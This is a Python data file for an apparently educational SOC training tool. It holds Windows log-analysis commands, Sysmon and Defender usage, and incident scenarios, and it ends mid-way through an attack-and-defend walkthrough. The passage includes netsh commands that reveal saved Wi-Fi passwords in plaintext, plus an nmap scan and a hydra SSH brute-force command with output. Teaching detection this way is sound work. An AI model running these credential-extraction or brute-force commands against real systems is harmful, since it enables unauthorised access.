    {"id": "win_3", "category": "Command Line Access", "color": "#3498db",
     "cmd": "wevtutil epl System C:\\Logs\\SystemLogs.evtx",
     "desc": "Export the entire System log to a .evtx file",
     "scenario": "Before clearing logs or investigating offline, export them. .evtx preserves everything — every event, every field, every XML property. Analysts can then open the file in Event Viewer, parse it with PowerShell, or ingest it into a SIEM.",
     "output": "(System.evtx copied to C:\\Logs\\SystemLogs.evtx)",
     "simulation": [
         {"from": "Analyst", "to": "wevtutil", "data": "epl System", "title": "Export log", "desc": "Copy entire channel", "color": "#3498db"},
         {"from": "wevtutil", "to": "C:\\Logs\\", "data": "Write file", "title": "Save .evtx", "desc": "Binary event log preserved", "color": "#f39c12"},
         {"from": "C:\\Logs\\", "to": "Analyst", "data": "SystemLogs.evtx", "title": "Ready", "desc": "Portable for SIEM or offline", "color": "#27ae60"}
     ]},
    {"id": "win_4", "category": "Command Line Access", "color": "#3498db",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 20",
     "desc": "Query recent failed logons via PowerShell (the modern way)",
     "scenario": "Get-WinEvent is the cmdlet you'll use 90% of the time. FilterHashtable is far more efficient than piping everything through Where-Object — the filter is applied by the Windows API before results are returned. This query shows the 20 most recent failed logon attempts.",
     "output": "TimeCreated          Id Message\n-----------          -- -------\n3/15/2024 2:23 PM  4625 An account failed to log on. (admin / 203.0.113.5)\n3/15/2024 2:23 PM  4625 An account failed to log on. (admin / 203.0.113.5)\n3/15/2024 2:24 PM  4625 An account failed to log on. (root / 203.0.113.5)",
     "simulation": [
         {"from": "PowerShell", "to": "Windows API", "data": "Filter 4625", "title": "Query", "desc": "API filters before return", "color": "#3498db"},
         {"from": "Security.evtx", "to": "Pipeline", "data": "20 events", "title": "Return", "desc": "Newest first", "color": "#f39c12"},
         {"from": "Pipeline", "to": "Terminal", "data": "Time, ID, Msg", "title": "Display", "desc": "Human-readable", "color": "#27ae60"}
     ]},
    {"id": "win_5", "category": "Command Line Access", "color": "#3498db",
     "cmd": "Get-WinEvent -LogName System -MaxEvents 50 | Select-Object TimeCreated, Id, ProviderName, LevelDisplayName, Message",
     "desc": "Read System events with PowerShell, showing useful columns",
     "scenario": "Get-WinEvent without a filter is fine for quick checks. Piping to Select-Object trims the output to the columns that matter: when, what ID, which provider, how severe, and what message. LevelDisplayName gives you 'Error', 'Warning', 'Information' instead of a number.",
     "output": "TimeCreated        Id ProviderName              LevelDisplayName Message\n-----------        -- ------------              ---------------- -------\n3/15/2024 2:30 PM  7045 Service Control Manager   Information      A service was installed...\n3/15/2024 2:25 PM  7000 Service Control Manager   Error            The Windows Update service failed...",
     "simulation": [
         {"from": "PowerShell", "to": "System.evtx", "data": "Read all", "title": "Open log", "desc": "Reads newest 50 events", "color": "#3498db"},
         {"from": "Select-Object", "to": "Pipeline", "data": "Trim columns", "title": "Format", "desc": "Only 5 useful fields", "color": "#f39c12"},
         {"from": "Pipeline", "to": "Terminal", "data": "Table", "title": "Display", "desc": "Compact output", "color": "#27ae60"}
     ]},
    {"id": "win_6", "category": "Command Line Access", "color": "#3498db",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='System';StartTime=(Get-Date).AddHours(-24)} | Group-Object Id | Sort-Object Count -Descending | Select-Object -First 10",
     "desc": "Rank event IDs by frequency in the last 24 hours",
     "scenario": "You want to know what's generating the most noise. This groups all System events from the last 24 hours by Event ID and ranks them. The top entry tells you what's dominating the log — good for spotting abnormal patterns.",
     "output": "Count Name\n----- ----\n  452 7036\n  234 7040\n  189 10010\n   89 219\n   45 7000",
     "simulation": [
         {"from": "PowerShell", "to": "System.evtx", "data": "Last 24h", "title": "Query", "desc": "Time-filtered events", "color": "#3498db"},
         {"from": "Group-Object", "to": "Pipeline", "data": "By Event ID", "title": "Group", "desc": "Count per ID", "color": "#f39c12"},
         {"from": "Sort-Object", "to": "Terminal", "data": "Top 10", "title": "Rank", "desc": "Biggest source first", "color": "#e74c3c"}
     ]},

    # ============================================================
    # EVENT VIEWER — GUI DEEP DIVE
    # ============================================================
    {"id": "win_7", "category": "Event Viewer GUI", "color": "#27ae60",
     "cmd": "eventvwr.msc",
     "desc": "Launch Windows Event Viewer — the primary GUI for log analysis",
     "scenario": "The classic way to browse logs visually. Three panes: left = log tree (Windows Logs, Applications and Services Logs, Custom Views); middle = event list; right = Actions (Filter, Find, Save, Clear). Everything the PowerShell cmdlets do, Event Viewer does interactively.",
     "output": "(Event Viewer window opens)\n\nLeft pane: Windows Logs → Application, Security, System, Setup, ForwardedEvents\nMiddle: event list with columns Level, Date and Time, Source, Event ID, Task Category\nRight pane: Actions — Filter Current Log, Find, Save All Events As, Clear Log, Properties",
     "simulation": [
         {"from": "Analyst", "to": "Run dialog", "data": "eventvwr.msc", "title": "Launch", "desc": "Event Viewer opens", "color": "#3498db"},
         {"from": "GUI", "to": "Left pane", "data": "Windows Logs", "title": "Tree", "desc": "Channels organized by category", "color": "#f39c12"},
         {"from": "GUI", "to": "Middle pane", "data": "Event list", "title": "Browse", "desc": "Click any channel to see its events", "color": "#27ae60"}
     ]},
    {"id": "win_8", "category": "Event Viewer GUI", "color": "#27ae60",
     "cmd": "(Right-click log) → Filter Current Log",
     "desc": "Filter events by ID, level, time range, user, or source",
     "scenario": "A log with 50,000 events is useless unfiltered. Right-click any log → Filter Current Log. You can filter by Event Level (Critical, Error, Warning, Information, Verbose), Event IDs (comma-separated), Logged time range, User, Computer, or Keywords. This is how you cut to the events that matter.",
     "output": "(Filter Current Log dialog)\n\nLogged: [Any time ▼] or [Last hour / Last 24 hours / Custom range...]\nEvent level: ☑ Critical ☑ Error ☑ Warning ☐ Information ☐ Verbose\nEvent IDs: 4625, 4624, 1102    <-- comma-separated\nUser: DOMAIN\\alice\nComputer: WORKSTATION-42\n\nClick OK → the middle pane now shows only matching events.",
     "simulation": [
         {"from": "Analyst", "to": "Right-click", "data": "Filter Current Log", "title": "Open filter", "desc": "Dialog appears", "color": "#3498db"},
         {"from": "Analyst", "to": "Filter dialog", "data": "IDs + level + time", "title": "Set criteria", "desc": "Narrow down the noise", "color": "#f39c12"},
         {"from": "Filter dialog", "to": "Middle pane", "data": "Filtered list", "title": "Apply", "desc": "Only matching events shown", "color": "#27ae60"}
     ]},
    {"id": "win_9", "category": "Event Viewer GUI", "color": "#27ae60",
     "cmd": "(Select event) → General tab + Details tab",
     "desc": "Read the friendly General view or switch to XML for raw data",
     "scenario": "Every event has two views. The General tab is human-readable — description, level, log name, source, event ID, user. The Details tab shows the raw XML/EventData — every field, including ones the friendly view hides. When you need an exact field like TargetUserName or IpAddress, switch to Details → XML View.",
     "output": "General tab:\n  An account failed to log on.\n  Subject: Security ID: SYSTEM\n  Account Name: WORKSTATION-42$\n  Logon Type: 3\n  Account For Which Logon Failed: Account Name: admin\n  Failure Reason: Unknown user name or bad password.\n  Source Network Address: 203.0.113.5\n\nDetails tab → XML View:\n<EventData>\n  <Data Name=\"TargetUserName\">admin</Data>\n  <Data Name=\"IpAddress\">203.0.113.5</Data>\n  <Data Name=\"LogonType\">3</Data>\n</EventData>",
     "simulation": [
         {"from": "Analyst", "to": "Event", "data": "Double-click", "title": "Open", "desc": "Event Properties dialog", "color": "#3498db"},
         {"from": "General tab", "to": "Analyst", "data": "Readable summary", "title": "Friendly view", "desc": "Description + key fields", "color": "#f39c12"},
         {"from": "Details tab", "to": "XML View", "data": "<EventData>", "title": "Raw fields", "desc": "Every field for scripting", "color": "#27ae60"}
     ]},
    {"id": "win_10", "category": "Event Viewer GUI", "color": "#27ae60",
     "cmd": "(Right-click log) → Properties",
     "desc": "Check log size, retention mode, and configure log rotation",
     "scenario": "Each log has a maximum size (default 20MB for most channels). When full, the retention policy decides what happens: overwrite oldest events, archive automatically, or stop logging. In forensic situations, a log that overwrote old events loses crucial evidence. Check Properties early.",
     "output": "(Log Properties dialog)\n\nLog path: C:\\Windows\\System32\\winevt\\Logs\\System.evtx\nLog size: 20.0 MB (20,971,520 bytes)\nCreated: 3/1/2024 9:00:00 AM\nModified: 3/15/2024 2:30:00 PM\nAccessed: 3/15/2024 2:30:00 PM\nMaximum log size: 20,480 KB\nWhen maximum log size is reached: ☑ Overwrite events as needed (oldest first)\n[Clear Log] [OK] [Cancel] [Apply]",
     "simulation": [
         {"from": "Analyst", "to": "Right-click log", "data": "Properties", "title": "Open dialog", "desc": "Log settings shown", "color": "#3498db"},
         {"from": "Dialog", "to": "Analyst", "data": "20 MB max", "title": "Check size", "desc": "Is it big enough?", "color": "#f39c12"},
         {"from": "Analyst", "to": "Dialog", "data": "Retention mode", "title": "Adjust", "desc": "Prevent evidence loss", "color": "#27ae60"}
     ]},
    {"id": "win_11", "category": "Event Viewer GUI", "color": "#27ae60",
     "cmd": "(Right-click log) → Save All Events As...",
     "desc": "Export filtered events for offline analysis or SIEM ingestion",
     "scenario": "After filtering to the events you care about, save them. Event Viewer supports .evtx (preserves everything), .csv (Excel-friendly), .txt (human-readable), and .xml (parseable). For incident reports, .csv or .txt works; for SIEM ingestion, .evtx or .xml.",
     "output": "(Save As dialog)\n\nSave as type: Event Files (*.evtx) | CSV (*.csv) | Text (*.txt) | XML (*.xml)\nFile name: incident_4625_20240315\nDisplay information: ☑ Display information in these languages: English (United States)\n\n[Save]",
     "simulation": [
         {"from": "Analyst", "to": "Right-click", "data": "Save All Events As", "title": "Export", "desc": "Dialog opens", "color": "#3498db"},
         {"from": "Analyst", "to": "Save dialog", "data": ".csv / .evtx", "title": "Choose format", "desc": "Depends on next step", "color": "#f39c12"},
         {"from": "Save dialog", "to": "File", "data": "incident_4625.csv", "title": "Saved", "desc": "Ready for report or SIEM", "color": "#27ae60"}
     ]},

    # ============================================================
    # SYSMON — INSTALL & USE
    # ============================================================
    {"id": "win_12", "category": "Sysmon", "color": "#9b59b6",
     "cmd": "Get-Service sysmon*",
     "desc": "Check if Sysmon is already installed and running",
     "scenario": "Before installing Sysmon, check if it's already there. Sysmon is disabled by default and must be explicitly enabled. If a service named Sysmon or Sysmon64 exists, it's installed.",
     "output": "(no output — Sysmon not installed)",
     "simulation": [
         {"from": "Analyst", "to": "PowerShell", "data": "Get-Service sysmon*", "title": "Query", "desc": "Check for Sysmon service", "color": "#3498db"},
         {"from": "PowerShell", "to": "SCM", "data": "Lookup", "title": "Check", "desc": "Service Control Manager queried", "color": "#f39c12"},
         {"from": "SCM", "to": "Terminal", "data": "No service", "title": "Result", "desc": "Not installed — proceed", "color": "#27ae60"}
     ]},
    {"id": "win_13", "category": "Sysmon", "color": "#9b59b6",
     "cmd": "sysmon -i",
     "desc": "Install Sysmon with default configuration",
     "scenario": "Sysmon (System Monitor) records high-fidelity system activity: process creation with full command lines, network connections, file creation, registry changes, DNS queries. It writes to its own event log channel: Microsoft-Windows-Sysmon/Operational. Install with -i to accept the license and register the service.",
     "output": "System Monitor v15.0 - Sysinternals\n\nValidating configuration file...\nInstalling the service...\nSysmon installed.\nSysmonDrv installed.\nStarting SysmonDrv.\nStarted SysmonDrv.\nUpdating service to start at boot...\nSysmon started.",
     "simulation": [
         {"from": "Analyst", "to": "sysmon.exe", "data": "-i", "title": "Install", "desc": "Registers driver + service", "color": "#3498db"},
         {"from": "sysmon.exe", "to": "Kernel", "data": "Load SysmonDrv", "title": "Driver", "desc": "Hooks into kernel events", "color": "#f39c12"},
         {"from": "sysmon.exe", "to": "Service", "data": "Start sysmon", "title": "Running", "desc": "Events now logged to channel", "color": "#27ae60"}
     ]},
    {"id": "win_14", "category": "Sysmon", "color": "#9b59b6",
     "cmd": "sysmon -c C:\\Sysmon\\sysmonconfig.xml",
     "desc": "Apply a config file to control which events Sysmon logs",
     "scenario": "Sysmon's default config is useless — it logs almost nothing. The real value comes from a config that enables specific event types. Two community favorites: SwiftOnSecurity's sysmon-config (broad coverage) and Olaf Hartong's sysmon-modular (MITRE ATT&CK mapped). The config is XML and defines include/exclude rules per event type.",
     "output": "System Monitor v15.0 - Sysinternals\n\nLoading configuration file...\nConfiguration file validated.\nUpdating configuration...\nConfiguration updated.",
     "simulation": [
         {"from": "Analyst", "to": "sysmon.exe", "data": "-c config.xml", "title": "Load config", "desc": "Read XML rules", "color": "#3498db"},
         {"from": "sysmon.exe", "to": "Service", "data": "Apply rules", "title": "Apply", "desc": "Filtering takes effect now", "color": "#f39c12"},
         {"from": "Service", "to": "Sysmon channel", "data": "Events logged", "title": "Active", "desc": "Only configured event types", "color": "#27ae60"}
     ]},
    {"id": "win_15", "category": "Sysmon", "color": "#9b59b6",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=1} -MaxEvents 20 | Select-Object TimeCreated, @{N='Image';E={$_.Properties[4].Value}}, @{N='CommandLine';E={$_.Properties[10].Value}}",
     "desc": "Read Sysmon Process Create events (ID 1) with command lines",
     "scenario": "Sysmon Event 1 is the single most valuable event for detection. It records every process creation with full command line, parent process, hashes, and user. If a user opens Word and Word spawns cmd.exe → powershell.exe, that whole chain is visible here.",
     "output": "TimeCreated        Image                 CommandLine\n-----------        -----                 -----------\n3/15/2024 2:25 PM  C:\\...\\WINWORD.EXE    \"C:\\Program Files\\...\\WINWORD.EXE\" invoice.docm\n3/15/2024 2:25 PM  C:\\...\\cmd.exe         cmd.exe /c powershell -enc SQBFAFgA...",
     "simulation": [
         {"from": "Windows", "to": "Sysmon", "data": "Process created", "title": "Event fires", "desc": "Kernel hook captures process", "color": "#3498db"},
         {"from": "Sysmon", "to": "Event 1", "data": "Image + CmdLine", "title": "Logged", "desc": "Full details written", "color": "#f39c12"},
         {"from": "Get-WinEvent", "to": "Analyst", "data": "Parent chain visible", "title": "Detect", "desc": "winword → cmd → PS", "color": "#9b59b6"}
     ]},
    {"id": "win_16", "category": "Sysmon", "color": "#9b59b6",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=3} | Where-Object {$_.Message -match 'Established'} | Select-Object TimeCreated, @{N='Image';E={$_.Properties[4].Value}}, @{N='DestIP';E={$_.Properties[14].Value}}, @{N='DestPort';E={$_.Properties[15].Value}}",
     "desc": "Read Sysmon Network Connect events (ID 3) — established only",
     "scenario": "Sysmon Event 3 logs every TCP/UDP connection with the process that made it. Filtering to 'Established' shows active sessions. A process like rundll32.exe connecting to an external IP on port 443 is a classic C2 indicator.",
     "output": "TimeCreated        Image                 DestIP         DestPort\n-----------        -----                 ------         --------\n3/15/2024 2:30 PM  powershell.exe        203.0.113.5   443\n3/15/2024 2:30 PM  rundll32.exe          185.234.72.11 8080",
     "simulation": [
         {"from": "Malware", "to": "Network", "data": "TCP connect", "title": "Connection", "desc": "Process reaches out", "color": "#e74c3c"},
         {"from": "Sysmon", "to": "Event 3", "data": "Image + DestIP", "title": "Logged", "desc": "Every connection attributed", "color": "#f39c12"},
         {"from": "Get-WinEvent", "to": "Analyst", "data": "C2 spotted", "title": "Detect", "desc": "Non-standard process on 443", "color": "#9b59b6"}
     ]},

    # ============================================================
    # MALWARE SCANNING
    # ============================================================
    {"id": "win_17", "category": "Malware Scanning", "color": "#e74c3c",
     "cmd": "Start-MpScan -ScanType QuickScan",
     "desc": "Run a Windows Defender quick scan",
     "scenario": "Windows Defender is built into every Windows system. QuickScan checks memory, startup locations, and common malware paths in 5-10 minutes. FullScan checks every file (hours). CustomScan targets specific paths. All three return immediately — the scan runs in the background.",
     "output": "(no output — scan runs in background)\n\nCheck status with: Get-MpComputerStatus | Select-Object QuickScanStartTime, QuickScanEndTime",
     "simulation": [
         {"from": "Analyst", "to": "Defender", "data": "QuickScan", "title": "Start", "desc": "Checks memory + startups", "color": "#3498db"},
         {"from": "Defender", "to": "Filesystem", "data": "Scan paths", "title": "Scan", "desc": "Common malware locations", "color": "#f39c12"},
         {"from": "Defender", "to": "Analyst", "data": "Results", "title": "Complete", "desc": "Threats shown in Defender UI", "color": "#27ae60"}
     ]},
    {"id": "win_18", "category": "Malware Scanning", "color": "#e74c3c",
     "cmd": "Start-MpScan -ScanType FullScan",
     "desc": "Run a full system malware scan with Windows Defender",
     "scenario": "When a quick scan finds nothing but you still suspect compromise, run a full scan. It checks every file on every drive. Takes hours but is exhaustive. Use `Get-MpThreatDetection` afterwards to list any detections.",
     "output": "(scan runs in background — hours)\n\nGet-MpThreatDetection | Select-Object ThreatID, ThreatName, Resources",
     "simulation": [
         {"from": "Analyst", "to": "Defender", "data": "FullScan", "title": "Start", "desc": "Every file scanned", "color": "#3498db"},
         {"from": "Defender", "to": "Disk", "data": "Read every file", "title": "Scan", "desc": "Hours-long operation", "color": "#f39c12"},
         {"from": "Defender", "to": "Analyst", "data": "Detections list", "title": "Review", "desc": "Threats + paths", "color": "#e74c3c"}
     ]},
    {"id": "win_19", "category": "Malware Scanning", "color": "#e74c3c",
     "cmd": "Get-MpThreatDetection | Select-Object ThreatID, ThreatName, Resources",
     "desc": "List all malware detected by Defender with file paths",
     "scenario": "After a scan, this shows every threat Defender found. Resources lists the exact file paths. ThreatName gives the malware family. Cross-reference these with your IOC list and incident timeline.",
     "output": "ThreatID                ThreatName                              Resources\n--------                ----------                              ---------\n2147723456              Trojan:Win32/Wacatac.B!ml               C:\\Users\\Public\\update.exe\n2147723457              HackTool:Win32/Mimikatz                 C:\\Users\\Public\\mimikatz.exe",
     "simulation": [
         {"from": "Defender", "to": "Threat DB", "data": "Detections", "title": "Query", "desc": "All identified malware", "color": "#3498db"},
         {"from": "Threat DB", "to": "Analyst", "data": "Threat + path", "title": "List", "desc": "What, where, family", "color": "#f39c12"},
         {"from": "Analyst", "to": "Response", "data": "Remove or isolate", "title": "Act", "desc": "Clean or preserve for forensics", "color": "#e74c3c"}
     ]},

    # ============================================================
    # WIFI PASSWORDS
    # ============================================================
    {"id": "win_20", "category": "WiFi Password Recovery", "color": "#16a085",
     "cmd": "netsh wlan show profiles",
     "desc": "List every saved Wi-Fi profile on the machine",
     "scenario": "Windows caches credentials for every Wi-Fi network you've ever connected to. This command lists them all. Useful for audits (are there stale profiles?), forensics (what networks did this machine connect to?), and recovery (I forgot my home WiFi password).",
     "output": "Profiles on interface Wi-Fi:\n\nGroup policy profiles (read only)\n---------------------------------\n    <None>\n\nUser profiles\n-------------\n    All User Profile     : HomeWiFi\n    All User Profile     : Office-Guest\n    All User Profile     : Starbucks\n    All User Profile     : CoffeeShop_5G",
     "simulation": [
         {"from": "Analyst", "to": "netsh", "data": "wlan show profiles", "title": "Query", "desc": "Read WLAN profiles from registry", "color": "#3498db"},
         {"from": "netsh", "to": "Windows", "data": "Read HKLM/HKCU", "title": "Lookup", "desc": "Stored wireless keys", "color": "#f39c12"},
         {"from": "Windows", "to": "Terminal", "data": "Profile list", "title": "Display", "desc": "Every saved network", "color": "#27ae60"}
     ]},
    {"id": "win_21", "category": "WiFi Password Recovery", "color": "#16a085",
     "cmd": "netsh wlan show profile name=\"HomeWiFi\" key=clear",
     "desc": "Reveal the plaintext password for a saved Wi-Fi network",
     "scenario": "The `key=clear` flag tells Windows to display the password in plaintext instead of hiding it behind asterisks. Look for the 'Key Content' field under 'Security settings'. You need admin privileges for this command.",
     "output": "Profile HomeWiFi on interface Wi-Fi:\n\nApplied: All User Profile\n\nProfile information\n-------------------\n    Version                : 1\n    Type                   : Wireless LAN\n    Name                   : HomeWiFi\n\nConnectivity settings\n---------------------\n    SSID name              : \"HomeWiFi\"\n    Authentication         : WPA2-Personal\n    Cipher                 : CCMP\n\nSecurity settings\n-----------------\n    Authentication         : WPA2-Personal\n    Cipher                 : CCMP\n    Security key           : Present\n    Key Content            : mywifi123",
     "simulation": [
         {"from": "Analyst", "to": "netsh", "data": "profile name=HomeWiFi", "title": "Query", "desc": "Read specific profile", "color": "#3498db"},
         {"from": "netsh", "to": "Windows", "data": "key=clear", "title": "Decrypt", "desc": "Password shown in plaintext", "color": "#f39c12"},
         {"from": "Windows", "to": "Terminal", "data": "Key Content", "title": "Revealed", "desc": "mywifi123 displayed", "color": "#27ae60"}
     ]},
    {"id": "win_22", "category": "WiFi Password Recovery", "color": "#16a085",
     "cmd": "netsh wlan show profile name=\"Office-Guest\" key=clear | findstr /C:\"Key Content\"",
     "desc": "Extract just the password line (fast for scripting)",
     "scenario": "When you need to loop through many profiles, filtering the output to just the Key Content line makes parsing easy. `findstr /C:\"Key Content\"` returns only that one line. Pipe it into a batch script that iterates through all profiles.",
     "output": "    Key Content            : guest2024",
     "simulation": [
         {"from": "Analyst", "to": "netsh", "data": "profile + key=clear", "title": "Query", "desc": "Full profile output", "color": "#3498db"},
         {"from": "findstr", "to": "Stream", "data": "Key Content", "title": "Filter", "desc": "Only the password line", "color": "#f39c12"},
         {"from": "Terminal", "to": "Analyst", "data": "guest2024", "title": "Result", "desc": "Ready for scripting", "color": "#27ae60"}
     ]}
]

WINDOWS_SCENARIOS = [
    {"id": "win_sc_1", "title": "Detect Failed Logon Brute Force", "icon": "🔨", "color": "#e74c3c",
     "situation": "Hundreds of failed RDP logons hit a server from a single external IP.",
     "detection_cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} | Group-Object -Property {$_.Properties[5].Value} | Sort-Object Count -Descending | Select-Object -First 10",
     "detection_output": "Count Name\n----- ----\n 4521 203.0.113.5\n  234 198.51.100.42",
     "analysis": "Event 4625 fires on every failed logon. Properties[5] holds the source IP. Grouping by IP and sorting by count gives you the top attackers instantly.",
     "response_cmds": [
         "New-NetFirewallRule -DisplayName 'Block Attacker' -Direction Inbound -RemoteAddress 203.0.113.5 -Action Block",
         "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Where-Object {$_.Properties[18].Value -eq '203.0.113.5'}",
         "Get-NetTCPConnection -State Established | Where-Object {$_.RemoteAddress -eq '203.0.113.5'}"
     ],
     "post_action": "Attacker IP blocked at Windows Firewall. Event 4624 check confirms no successful logon ever happened from that IP. TCP check confirms no active session.",
     "simulation": [
         {"from": "Attacker 203.0.113.5", "to": "RDP:3389", "data": "Login attempts", "title": "Attack starts", "desc": "Automated tool hits RDP", "color": "#e74c3c"},
         {"from": "Windows", "to": "Event 4625", "data": "Failed logon", "title": "Logged", "desc": "Each failure written", "color": "#f39c12"},
         {"from": "Analyst", "to": "Firewall", "data": "Block IP", "title": "Respond", "desc": "Attacker dropped", "color": "#27ae60"}
     ]},
    {"id": "win_sc_2", "title": "Track Service Persistence via Event 7045", "icon": "🔒", "color": "#9b59b6",
     "situation": "A new Windows service appeared, running from a user-writable directory. This is a common persistence mechanism.",
     "detection_cmd": "Get-WinEvent -FilterHashtable @{LogName='System';ID=7045} -MaxEvents 20 | Select-Object TimeCreated, @{N='ServiceName';E={$_.Properties[0].Value}}, @{N='ImagePath';E={$_.Properties[1].Value}}",
     "detection_output": "TimeCreated        ServiceName       ImagePath\n-----------        -----------       ---------\n3/15/2024 2:45 PM  WindowsUpdateSvc  C:\\Users\\Public\\svchost.exe",
     "analysis": "Event 7045 fires on every service install. Look at ImagePath — legitimate services live in System32 or Program Files. A path under C:\\Users\\Public is malware.",
     "response_cmds": [
         "Get-CimInstance Win32_Service | Where-Object {$_.PathName -like '*Public*'} | Select-Object Name, PathName, State",
         "sc.exe delete WindowsUpdateSvc",
         "Get-FileHash 'C:\\Users\\Public\\svchost.exe'"
     ],
     "post_action": "Malicious service removed via sc.exe delete. File hashed for IOC lookup. Check for related files in the same directory.",
     "simulation": [
         {"from": "Attacker", "to": "Windows", "data": "sc create svc", "title": "Install", "desc": "Malware persisted", "color": "#e74c3c"},
         {"from": "SCM", "to": "Event 7045", "data": "Service installed", "title": "Logged", "desc": "System channel records it", "color": "#f39c12"},
         {"from": "Analyst", "to": "Service", "data": "sc delete", "title": "Remove", "desc": "Persistence broken", "color": "#27ae60"}
     ]},
    {"id": "win_sc_3", "title": "Find Suspicious Outbound Connections", "icon": "🌐", "color": "#16a085",
     "situation": "An endpoint is beaconing to an unknown external IP. You need to identify which process is responsible.",
     "detection_cmd": "Get-NetTCPConnection -State Established | Where-Object {$_.RemoteAddress -notmatch '^(127\\.|10\\.|192\\.168\\.)'} | ForEach-Object { $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue; [PSCustomObject]@{Remote=$_.RemoteAddress; Port=$_.RemotePort; Process=$proc.Name; Path=$proc.Path} }",
     "detection_output": "Remote        Port Process       Path\n------        ---- -------       ----\n185.234.72.11 443  rundll32.exe  C:\\Users\\Public\\svchost.exe",
     "analysis": "rundll32.exe running from C:\\Users\\Public (not System32) connecting to an external IP = strong C2 indicator. The Path column reveals the true executable location.",
     "response_cmds": [
         "Get-Process -Id (Get-NetTCPConnection -RemoteAddress '185.234.72.11').OwningProcess",
         "Get-FileHash 'C:\\Users\\Public\\svchost.exe'",
         "Get-AuthenticodeSignature 'C:\\Users\\Public\\svchost.exe'"
     ],
     "post_action": "Process identified, file hashed, signature verified (NotSigned). The file is malware masquerading as a system process. Isolate the host.",
     "simulation": [
         {"from": "Malware", "to": "C2 Server", "data": "Beacon :443", "title": "Callback", "desc": "Malware reaches controller", "color": "#e74c3c"},
         {"from": "Get-NetTCPConnection", "to": "Analyst", "data": "External IP list", "title": "Detect", "desc": "See suspicious IP", "color": "#f39c12"},
         {"from": "Analyst", "to": "Host", "data": "Isolate", "title": "Respond", "desc": "Cut network, hash file", "color": "#27ae60"}
     ]}
]


MODULES["windows"] = {
    "key": "windows",
    "title": "Windows Log Analysis",
    "icon": "🪟",
    "template": "windows.html",
    "intro": {
        "what": (
            "Windows Event Logs record every system event, application crash, security authentication, and "
            "service change. For a SOC analyst they are the primary forensic artifact on any Windows endpoint. "
            "Event Viewer gives you the GUI; wevtutil, Get-WinEvent, and Get-EventLog give you the command "
            "line. Sysmon dramatically expands what's logged — process creation with command lines, network "
            "connections, file creation, and DNS queries. Mastering these tools means you can investigate any "
            "Windows incident: brute force, malware execution, persistence, and lateral movement."
        ),
        "why_soc": [
            "Read Security logs — failed logons (4625), successful logons (4624), privilege use (4672)",
            "Use Sysmon for high-fidelity events — process create (1), network connect (3), file create (11)",
            "Filter and export from Event Viewer — for reports, SIEM ingestion, or offline analysis",
            "Scan for malware with Windows Defender — QuickScan, FullScan, and threat detection queries",
            "Recover saved Wi-Fi passwords — audit stale profiles or recover forgotten credentials",
            "Query logs remotely — Get-WinEvent supports -ComputerName for fleet-wide investigation"
        ]
    },
    "commands": WINDOWS_COMMANDS,
    "scenarios": WINDOWS_SCENARIOS,
    "extra": {}
}

# ==================== MODULE: ATTACK & DEFEND ====================
MODULES["attack_defend"] = {
    "key": "attack_defend",
    "title": "Attack & Defend",
    "icon": "⚔️",
    "template": "attack_defend.html",
    "intro": {
        "what": (
            "Real attacks shown from both sides. Each scenario walks through the attacker's exact commands, "
            "their outputs, and how they moved from initial access to impact. Then it flips to the defender's "
            "view — how the SOC detected the activity, the investigation commands they ran, and the containment "
            "steps that stopped it. This is what an attack looks like end-to-end, from the red team's keyboard "
            "to the blue team's incident response."
        ),
        "why_soc": [
            "See the attack from the attacker's view — know what they do so you can detect it",
            "Learn the exact commands a real attacker runs at each stage",
            "Understand how SOC teams correlate logs, endpoint data, and firewall events",
            "Learn containment steps — network isolation, process kill, credential rotation",
            "Practice the same commands you'd run during a real incident",
            "Build intuition for the attacker-defender cat-and-mouse game"
        ]
    },
    "commands": [],
    "scenarios": [],
    "extra": {
        "attacks": [
            # ============================================================
            # SCENARIO 1 — SSH BRUTE FORCE → ROOT COMPROMISE
            # ============================================================
            {
                "id": "atk_1",
                "title": "SSH Brute Force → Root Compromise",
                "icon": "🔨",
                "color": "#e74c3c",
                "severity": "CRITICAL",
                "target": "Linux web server (prod-web-01, Ubuntu 22.04)",
                "duration": "3 hours from recon to compromise",
                "summary": "An attacker scans a public IP range, finds an exposed SSH server, brute forces a weak user password, escalates to root via a SUID binary, and exfiltrates the web database.",

                "attack_chain": [
                    {"phase": "Reconnaissance", "icon": "🔍",
                     "cmd": "nmap -sV -p 22,80,443 203.0.113.10",
                     "desc": "Attacker scans the target for open ports and service versions",
                     "output": (
                         "Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-15 23:45 UTC\n"
                         "Nmap scan report for 203.0.113.10\n"
                         "Host is up (0.045s latency).\n"
                         "PORT    STATE SERVICE  VERSION\n"
                         "22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5\n"
                         "80/tcp  open  http     Apache httpd 2.4.41\n"
                         "443/tcp open  ssl/http nginx 1.18.0\n"
                         "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n"
                         "Nmap done: 1 IP address (1 host up) scanned in 12.3 seconds"
                     ),
                     "why": "SSH on 22 + Apache + nginx. Standard web server. OpenSSH 8.2p1 is known but not exploitable directly — the attacker goes for credential attacks instead.",
                     "detection_hint": "Firewall logs (UFW BLOCK) record the port scan. Nmap's SYN pattern is obvious to any IPS."},

                    {"phase": "Brute Force", "icon": "💥",
                     "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://203.0.113.10",
                     "desc": "Attacker brute forces SSH with the 'admin' username and rockyou.txt",
                     "output": (
                         "Hydra v9.4 (c) 2023 by van Hauser/THC\n"
                         "[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries\n"
                         "[DATA] attacking ssh://203.0.113.10:22/\n"
                         "[STATUS] 1234 tries in 60 seconds\n"
                         "[STATUS] 2456 tries in 120 seconds\n"
                         "[22][ssh] host: 203.0.113.10   login: admin   password: Summer2024!\n"
                         "1 of 1 target successfully completed, 1 valid password found"
                     ),
                     "why": "The password 'Summer2024!' is in the rockyou wordlist. Weak password policies let brute force succeed in under 3 minutes.",
                     "detection_hint": "auth.log shows hundreds of 'Failed password' lines followed by one 'Accepted'. Fail2ban would ban the IP after 5 attempts."},

